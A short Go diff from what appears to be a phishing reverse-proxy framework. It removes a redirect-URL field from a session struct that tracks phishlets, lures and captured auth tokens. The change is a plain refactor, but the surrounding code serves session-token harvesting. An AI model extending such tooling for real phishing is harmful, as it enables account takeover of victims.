@@ -36,7 +36,6 @@ type Session struct {
 	ID           string
 	Phishlet     string
 	LureID       string
-	RedirectURL  string // resolved at session creation from the lure's RedirectURL
 	RemoteAddr   string
 	UserAgent    string
 	JA4Hash      string
@@ -51,8 +50,6 @@ type Session struct {
 	StartedAt    time.Time
 	CompletedAt  *time.Time // nil until all auth_tokens are captured
 }
-
-func (s *Session) LureRedirectURL() string { return s.RedirectURL }
 
 // IsDone returns true when all required auth tokens have been captured.
 func (s *Session) IsDone() bool { return s.CompletedAt != nil }
@@ -252,7 +249,6 @@ func (s *SessionService) NewSession(ctx *ProxyContext) (*Session, error) {
 
 	if ctx.Lure != nil {
 		sess.LureID = ctx.Lure.ID
-		sess.RedirectURL = ctx.Lure.RedirectURL
 	}
 
 	if ctx.Phishlet != nil {
